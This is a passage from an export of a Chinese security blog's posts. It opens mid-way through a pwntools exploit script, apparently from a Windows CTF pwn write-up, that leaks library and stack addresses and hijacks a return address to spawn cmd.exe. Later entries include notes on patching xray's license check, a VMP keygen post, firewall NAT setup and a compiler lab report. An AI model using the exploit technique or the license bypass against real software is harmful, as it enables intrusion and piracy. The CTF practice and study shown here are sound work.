punctuation">)</span>show2<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#</span>ucrtbase_addr <span class="token operator">=</span> uu32<span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x30340</span>  <span class="token comment" spellcheck="true"># ucrtbase._set_new_mode</span>lg<span class="token punctuation">(</span><span class="token string">'ucrtbase_addr'</span><span class="token punctuation">,</span>ucrtbase_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 正常操作是 泄露 > ntdll  ucrt  > peb > teb > stackbase  >  main_ret</span><span class="token comment" spellcheck="true"># 我想找一个更加捷径的路子  没找到 我是🖍</span>system_addr <span class="token operator">=</span> ucrtbase_addr <span class="token operator">+</span> <span class="token number">0xB4E90</span>lg<span class="token punctuation">(</span><span class="token string">'system_addr'</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">## 修改次数限制</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>pie <span class="token operator">+</span> <span class="token number">0x6018</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x0fffffff</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>Edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>pie <span class="token operator">+</span> <span class="token number">0x400C</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>show2<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#</span>ntdll_addr <span class="token operator">=</span> uu32<span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x2E026</span> <span class="token comment" spellcheck="true"># ntdll.RtlAllocateHeap</span>lg<span class="token punctuation">(</span><span class="token string">'ntdll_addr'</span><span class="token punctuation">,</span>ntdll_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># dd ntdll!PebLdr</span><span class="token comment" spellcheck="true"># peb 和 teb 差0x3000</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>ntdll_addr <span class="token operator">+</span> <span class="token number">0x10424C</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>show2<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#</span>peb_addr <span class="token operator">=</span> uu32<span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x44</span> <span class="token comment" spellcheck="true"># 泄露 peb</span>lg<span class="token punctuation">(</span><span class="token string">'peb_addr'</span><span class="token punctuation">,</span>peb_addr<span class="token punctuation">)</span>teb_addr <span class="token operator">=</span> peb_addr <span class="token operator">-</span> <span class="token number">0x1000</span>  <span class="token comment" spellcheck="true"># 太奇怪了这里</span>lg<span class="token punctuation">(</span><span class="token string">'teb_addr'</span><span class="token punctuation">,</span>teb_addr<span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>teb_addr <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show2<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>StackBase <span class="token operator">=</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'\x00\x00'</span> <span class="token operator">+</span> r<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'StackBase'</span><span class="token punctuation">,</span>StackBase<span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>teb_addr <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show2<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>StackLimit <span class="token operator">=</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token operator">+</span> r<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'StackLimit'</span><span class="token punctuation">,</span>StackLimit<span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'mainret_addr'</span><span class="token punctuation">,</span>pie <span class="token operator">+</span> <span class="token number">0x239A</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>StackLimit <span class="token operator">+</span> <span class="token number">0x2500</span> <span class="token punctuation">,</span>StackBase<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 爆破返回地址</span>    Edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    show2<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># lg(hex(i), u32(rl().ljust(4, "\x00")[:4]))</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>u32<span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span>pie <span class="token operator">+</span> <span class="token number">0x239A</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ret_stack_addr <span class="token operator">=</span> i        lg<span class="token punctuation">(</span><span class="token string">'stack_addr'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>        <span class="token keyword">break</span>Edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>ret_stack_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>StackLimit<span class="token punctuation">)</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>StackLimit<span class="token punctuation">)</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"cmd.exe\x00"</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'Command:'</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs通关记录</title>
      <link href="/2021/01/03/sqli-labs-tong-guan-ji-lu/"/>
      <url>/2021/01/03/sqli-labs-tong-guan-ji-lu/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">请输入文章密码！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="4aa66a15cd43cfbb6c38e649d3cea3cd3ffad25c8d0633fbf28d9eb3ea107fbf">ca7a67df69ad262268dc424c73472201bb9a7db542b33a9b50cd9438e4e67f85bddd35e1bc980d5a51d762eea22d9c63deda4912428b8763af101a4c0decaa40d241bf971428ea0c46a5035a65a9d0534c4c801c42031cec9ec95c7787d021ecefba7bb0731dc7d077a261cb6e755c803c858407285c46eae172d9c7771aceb86751c487eda8648e5a1585671f3decb841c50e6cf82540bb423fb54a4e7f4014cbfebaf4432d5eb3433b125d04b8d1d3b188c0a5088388d960cb49e8a18053a6e4ed1ff53938cb2d64ef10ef63ef6247b5de98e97bbb96b6b00d224ddf3723aeb7f3308385fdb4bca1dc8cc66b9c3cfcf19eb242668ca801da22f18bc392c41a24a902d20ad0366c353ad0e4915577796f66313cbfba2c453d2cddaeb37af6ac7dfc760a81f0b821279929e7eb84128cb7b5677fc2cd960f27d2982fb98a0166e959f7ff63c24453c6ab10580b5de7c5fbedd8fb1701600fe021bfb13668112782c9c921df5afa3f76b2cb5ece59c5ca98846623422bbd54800079cd7a99ba1c24b1a36bb308e7cfbf986bc6315a4fd2ec371c51b1dfd3c417b8e2a9b4dc2fb88a60fef02762cb9d66f77d18196043b4b887d951f085e21fb6c24c7ae9ffe6b1d94bc618b9487874655825b0d929539cbcd50ba13008f925ece77f114f3b57f507e3dad7b8952efaba5a0f83362cc8518f13acf5e868e8ef886a53430a84f606d02e576e272edf024d4b13738e185cb658283a0870973072de41eb88708708e37ffa8fe3857e65f76bbcf3da7f9b723ba33d41236d3ac1e49794f46e8c8df8ae95dede4ea5fa92f33fb72001bdc81e577b212b89e0cd75570232c032fab5c5dd4f1554fd711a781c68d1709124dfe76f371bb1a981abdb28df7d9f9b04bb7e2e8fccc48ef12d01114b37cbf0ee1e68cbfc5ed989ac53560726f3cb370a1d248e6997df9cca1480a7ab61d6ee0ea3bf0f700c19aece56402aa69fe044e74756dc6e7a22a700da456ca57d694980a6f72a4f1295c79ed8fe0b26531b192aea2e22b86affe1073beed64f29d5ee78ecfca132907b62859ce7cd2639a818287ff01ef7fbe9b52e4f854dc93df70cff4dc8063b0aa3e710e1bbb14151c71e7c02f975d5c857f71596eb91665350c3b0c6ab56504e621e521e70a562ebd0a2fb8335d7e601b418f908af7a59deb767b755c144b506e1efb241704b7aa5a7e082641b87186f2aac41efb559ee912aeac4ece61b5bad970f8ffa8b78728e0457f482e5c2680b2dbe516a1514e016c1194aa307eee177ceb0a6f6d33133ebc4b605fd2df2dfe2b34b1c2b2ff92ff989b07ec25fdd725692b9acfe84a0629c3d1532c54745f148f2fe7ff40fa4632619b9f4761e7bd704e679d6c5ea9ccfa882fc34bec0f27666209710723bd01ca7ed88a97623f0942e2a8110c205b46ea3e110770087587d94024e9d444c632460dea9715c166e19888f9f81c0ed1f525b355693c18bade988ad99ca524b243dffb8a0886c5d0bc0afd43319d58dd23bee1777a5028841b50d326a2b000a093db97a82993f2145131ec7ac6deb3ddc30588020d967301a4ba987bff7fb1e3291b89103f3337052520ce1d21e8953eb60fca8cf11019626b2e8a71576e8dc9a3125d7c78774fb354479d1dc3dd64353357fb89972688edb0eaf44507668fcac2f2dd0a3721fe642977a519e473bcbda39f08e3fade37fafa39e0f107a1d87823ebc261a64db72bb82240fcfa3b5c204baa28840bbab36e15a33cada47a1613ab7917bcab063bb1f4a678f7aefef0f3bff0e69813bda8cd1dfe68bf492db02999f9c6146c2f7acdf48b930c3b2ade7bc0f5b60c0ac8712e2020fbb1a757b2e03b1db5abeb636f3c6141e0c827f52bd492faf12498762c031b9deb9b0de250081ad7460aa0afbc3b56f874a2b0f00fed30a600286e0970f7daa57bd1fc6583e1a5c85f8da4313deabb96d88536bbfecb89f243dc6afe6291df0474e70cda3975ce4adf456ad3f7535a702363a2820c008712678a7005fa5245c9bb797075f3ef2796fb94aef421dd664a0907c94c68f65f6f8c42124a1ec8b50820c2328fc25fe4576c61bfc78d667c9854de4792202a3e489ddf2464ec8d77ecba7e7d9a82107d97e847f35c731dd77ea993394c6aa0e1478513d3583adabe78aebe92814efe44d2ea58433d743422b2e14b16f44f56839d2e53d64399317c212110f574b754451662562368a332aaa4a9e7f8dcb99190ab2bf80299ab257d36b1d10cd2a6d96afa3e62f6e3e5f8b27c390c694b2b5f2a38e5c76cee8950f98fd8184abfd4e3847cbc5212b7e12f103b99f4689f0b21e070f7a04cd5e235b9e7e8afa358649079c8aa3efce2c3e4e0f8d407b22c9cdb48c7fa7bd80c4ab13569a2ffd93ff4d9a32bd446fbe2ac9828ceeac6c79eef0a8f53e5ff33e94c6e508a535665681d0eba98bc38f586c54a5b7856bfadcc4e1f9ab08515bde2f420fc1787e59556f975f809002f9f686c16207b3754da458c279c688d9c43a106c48f5dca1cf84eddc7dcd8ccc7a119cdc625dd13a8793c416022ea7f4638a9c6ccb2c65e3ba496b45d01b6c4522bbb275349b87364da0967d2649d642e9024609eef5d1b84c6ea5d181f0a447c21a99fa55117ef9e8ed62a5108adbbb0dd175ca527b19a29d892f0ea9b96e7c484caa4449b5e864be161744b062c27a234526f1cc73076ba636e1af9379f969c703431f5570d9308d4588ccd0a4fc08dfd1c7d1db2fd41fe098bef647e6877d2038054125171f09578ec4eeac33194d4711a7a27c4b71087edc7c25266707ac6c05c383aafcb76564adacff12ab42b64b88416278b966eabce3dfa13660b2b3bea746999c845eebc070136f98870bb41741dccce1b1ae42b2cb4398b72a78547bc849c90bb30cb42d5fa6ccb5365be64a98f13f1828d489f0ded9e963584b891bbacb1e7d85242a5a07082d629873e5bf83a85254ba0fc7f2f4b7bf7e7f1d3fcf2f198549f3ca6c4094ad16bf2713ac5954834a9891bf7949d275b27572654929f22fca9258a5c6f416c83c376ea9051f32e0ed3cf4015b3f90ebd4bea372185ab02193b36f08ef9ad731e80b16868e6829eeeee9a0cfb2844be2cca8319d0a0210b551e41425df5aaa658653dab91607b5f9db22d46732f39b76a2350d97e3076234228b7ed517fdde7b2a55973ba1f908e6fc42271cefaa0239d44abc918c38aad48215b5a7ad9b48554659e7ab17399a0d102319839a7673377d2348e1101b9f9bbe18d8cec91167db1c0466926eb313df5d4b58adb6c2200dde3d440223fe9568f583b8ae7eb6de82c37517431083631dad7057f103210343eeddcd9c977c8fc9f7decc92d00b126223e4f7f779c4baddac5e0fc58253f96e2a682b92b2c3fbd9b0c85f504e89ee3817ba00a30314dd2b3ca8818b76b90a21babeaad2d6722fe5a7af325f0b8a862ed5dac0e964a5fcfe3f23910eb57dbf79a03a0582cac4372d84f69b6eadc119870a1990ea59513303fdd66540dd995aeda2f2585e34166fddb7eba4c5ae193032d927669f59040dcac09916e1c60fe43d9afd544e55b9f5169c89e66f6eb5c78ed28cac3a3a8de81a8179b44dd992b4a61d79b615a16f6e06d7aade0db8f73d57c7b5f03a9423f7847468a109e798896df2f498d3e8c9ab2d4e7c19a336240f481235b0e8f6a1d7539f3c68d990dc3c4398c56ccbf4c8ff375096a0b892f5306a8d3e22420463977b39a36d0b104f8493ceb4bd45fae75e465449e99f58845e3fc7f37f8b6c4596ce99732da41c1a8d1acfecbfc23dcdb2b49ff10d09a8b422b13f0b97f48ce4dacfac7c9e2aa213548a8f43d2c527546470e1f56dd9780c52f1e51ae1b0912d58fad9a51da8b839550b1030eddf37fb0ddb82519a913071b61d316bb3b7d9897f9b0901dbe8f73e9258d9b1861ac3b0634baaf4b5523acef4aaaefda6930ae964c3e0c22b2e81c36b3f6979902837e905ba38cdd525e1502a17520701103d3861d56fc6ab38444e0a54aeebe4d4349bc86911cc0741845476f94944c5c8cc9e3c850f8e4cb918f7432ed8dd0bafb0a66ec80780794dd2a5dbb255f275a98f576038b039e596ccaffd8639a1d59985f08817b8b792d7d71283570fba9d5618020d4c8f8cec983babd13a99e696e21a92c9b615234d9bb4731701a33c556b56defc487f59fd81100ac488b695c608e7ff6f88efdbd80caa8060323ae84684d43b8ec65267e5bcc633bcc534df7987d2a09246ae77df82f4418e2a11081e558416f3d577022fb30f6230635f736e6acc3b07fb49634a7a0ce318befa406575e81143a22823247380afd3b54842a93593400e3634855f221fa9043038ce4793e3fa3ca0b8c9e9f0aa102bf8286508c5ab427855c85afac11fceeb54540d529225b956b6c68f98f8030ee7c48b3e7dc2fa971e78ac8a</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xray逆向记录</title>
      <link href="/2020/11/29/xray-ni-xiang-ji-lu/"/>
      <url>/2020/11/29/xray-ni-xiang-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="xray逆向"><a href="#xray逆向" class="headerlink" title="xray逆向"></a>xray逆向</h1><p>使用插件来加载符号~</p><p>拉到最下面找到main_main,寻找打开注册码的位置。</p><p><img src="xray%E9%80%86%E5%90%91%E8%AE%B0%E5%BD%95.assets/image-20201129162939910.png" alt="image-20201129162939910"></p><p>寻找key和iv ，很奇怪，我找不到block的指针。</p><p><img src="xray%E9%80%86%E5%90%91%E8%AE%B0%E5%BD%95.assets/image-20201129174840066.png" alt="image-20201129174840066"></p><p> key是固定的，IV是base64解密以后的前16个字节。</p><p>最后需要patch两个函数下面的jz 第一个是跳转，第二个是不跳转</p><p><img src="xray%E9%80%86%E5%90%91%E8%AE%B0%E5%BD%95.assets/image-20201129220623283.png" alt="image-20201129220623283"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-16898调试复现记录</title>
      <link href="/2020/11/10/cve-2020-16898-diao-shi-fu-xian-ji-lu/"/>
      <url>/2020/11/10/cve-2020-16898-diao-shi-fu-xian-ji-lu/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">请输入文章密码！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b3c93ee0eff844cc15f5ef6598da3ac3b1d2e7c0cc503b5385f67d0dc498558f"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN练习记录</title>
      <link href="/2020/11/03/pwn-lian-xi-ji-lu/"/>
      <url>/2020/11/03/pwn-lian-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="2020年11月3日-练习记录"><a href="#2020年11月3日-练习记录" class="headerlink" title="2020年11月3日 练习记录"></a>2020年11月3日 练习记录</h1>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>飞塔防火墙配置将内网ip映射到外网</title>
      <link href="/2020/11/03/fei-ta-fang-huo-qiang-pei-zhi-jiang-nei-wang-ip-ying-she-dao-wai-wang/"/>
      <url>/2020/11/03/fei-ta-fang-huo-qiang-pei-zhi-jiang-nei-wang-ip-ying-she-dao-wai-wang/</url>
      
        <content type="html"><![CDATA[<h2 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image(1).png" alt="Image(1)"></p><pre><code>启动以后重设密码execute factoryresetshow system interfaceconfig system interfaceedit port1set mode staticset ip 192.168.93.99 255.255.255.0   nat的其中一个地址end此时即可开启web登录</code></pre><h2 id="配置WAN"><a href="#配置WAN" class="headerlink" title="配置WAN"></a>配置WAN</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image.png" alt="Image"></p><h2 id="配置LAN"><a href="#配置LAN" class="headerlink" title="配置LAN"></a>配置LAN</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image%20%5B2%5D.png" alt="Image [2]"></p><p>配置映射内网ip到外网，先配置虚拟ip</p><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image%20%5B3%5D.png" alt="Image [3]"></p><h2 id="配置防火墙策略"><a href="#配置防火墙策略" class="headerlink" title="配置防火墙策略"></a>配置防火墙策略</h2><p><img src="%E9%A3%9E%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E5%B0%86%E5%86%85%E7%BD%91ip%E6%98%A0%E5%B0%84%E5%88%B0%E5%A4%96%E7%BD%91.assets/Image%20%5B4%5D.png" alt="Image [4]"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Affinic Debugger for GDB 安装注册过程</title>
      <link href="/2020/01/31/affinic-debugger-for-gdb-an-zhuang-zhu-ce-guo-cheng/"/>
      <url>/2020/01/31/affinic-debugger-for-gdb-an-zhuang-zhu-ce-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Affinic-Debugger"><a href="#Affinic-Debugger" class="headerlink" title="Affinic Debugger"></a>Affinic Debugger</h1><p>Affinic Debugger，.aka。ADG旨在成为各种调试器的日常图形用户界面（GUI）。此构建专门针对GDB，GNU调试器和LLDB，LLVM调试器。通过图形窗口，ADG可以通过在一个视图中查看多个信息，然后单击轻松进行调试，从而释放您正在使用的调试器的全部功能。ADG还提供了一个独特的集成命令终端，供用户直接输入调试器命令以完成在文本模式下可以执行的任何任务。ADG在Linux / Windows / Mac OS X上可用。</p><p>Affinic Debugger的目标是为任何类型的用户提供最佳的调试体验。它试图通过直观的界面提供超快的速度，以操纵代码和大量数据以帮助分析。ADG提供了其他IDE无法做到的功能，例如GDB / LLDB终端，程序集调试，远程调试，反汇编，内存更新和线程调试等。ADG是一个不断发展的产品。欢迎您提供反馈意见，以帮助它变得更好，更强大。只需给我们发送电子邮件。</p><p><strong>就是一款GUI的调试器，用的是GDB或者LLDB作为后端。</strong></p><p>官方地址： <a href="http://www.affinic.com/?page_id=109" target="_blank" rel="noopener">http://www.affinic.com/?page_id=109</a></p><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p>分为Windows 版本和Linux 版本，</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> gdb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> Affinic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMP授权keygen分析</title>
      <link href="/2020/01/11/vmp-shou-quan-keygen-fen-xi/"/>
      <url>/2020/01/11/vmp-shou-quan-keygen-fen-xi/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">请输入文章密码！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="f1e05eebebf1399fcb855adc7bef09563123fabb31fbbcf473c0115b99b3d5e9">2b761fe06f815075b3c564ce3c99428b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> VMP </tag>
            
            <tag> keygen </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tiny 实验报告</title>
      <link href="/2020/01/11/tiny-shi-yan-bao-gao/"/>
      <url>/2020/01/11/tiny-shi-yan-bao-gao/</url>
      
        <content type="html"><![CDATA[<h1 id="实验报告"><a href="#实验报告" class="headerlink" title="实验报告"></a>实验报告</h1><h2 id="分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构"><a href="#分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构" class="headerlink" title="分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构"></a>分析该语言的词法和语法规则，分析其编译器的运行命令和代码组成结构</h2><h3 id="词法规则"><a href="#词法规则" class="headerlink" title="词法规则"></a>词法规则</h3><p>下面是LEX中的变量声明</p><p>定义段可以包含任意的C语言文件，符号说明，其代码会被直接拷贝到生成的扫描器代码文件中</p><p>声明示例如下</p><blockquote><p>%{</p><p>…</p><p>%}</p></blockquote><pre><code>digit       [0-9]number      {digit}+letter      [a-zA-Z]identifier  {letter}+newline     \nwhitespace  [ \t]+</code></pre><p>下面是一些关键字，规则段利用正则表达式来匹配模式，每当成功匹配一个模式，就对应其后“{ }” 中的代码。</p><p>语法规则示例如下</p><blockquote><p>%%</p><p>…</p><p>%%</p></blockquote><pre class="line-numbers language-c++"><code class="language-c++">"if"            {return IF;}"then"          {return THEN;}"else"          {return ELSE;}"end"           {return END;}"repeat"        {return REPEAT;}"until"         {return UNTIL;}"read"          {return READ;}"write"         {return WRITE;}":="            {return ASSIGN;}"="             {return EQ;}"<"             {return LT;}"+"             {return PLUS;}"-"             {return MINUS;}"*"             {return TIMES;}"/"             {return OVER;}"("             {return LPAREN;}")"             {return RPAREN;}";"             {return SEMI;}{number}        {return NUM;}{identifier}    {return ID;}{newline}       {lineno++;}{whitespace}    {/* skip whitespace */}"{"             { char c;                  do                  { c = input();                    if (c == EOF) break;                    if (c == '\n') lineno++;                  } while (c != '}');                }.               {return ERROR;}%%int yywrap(){ return 1;}TokenType getToken(void){ static int firstTime = TRUE;  TokenType currentToken;  if (firstTime)  { firstTime = FALSE;    lineno++;    yyin = source;    yyout = listing;  }  currentToken = yylex();  strncpy(tokenString,yytext,MAXTOKENLEN);  if (TraceScan) {    fprintf(listing,"\t%d: ",lineno);    printToken(currentToken,tokenString);  }  return currentToken;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加<code>//</code> 和 <code>/* */</code>的规则</p><pre class="line-numbers language-C"><code class="language-C">"//"             { char c;                  do                  { c = input();                    if (c == EOF) break;                  } while (c != '\n');                }"/*"             { char c;                   int 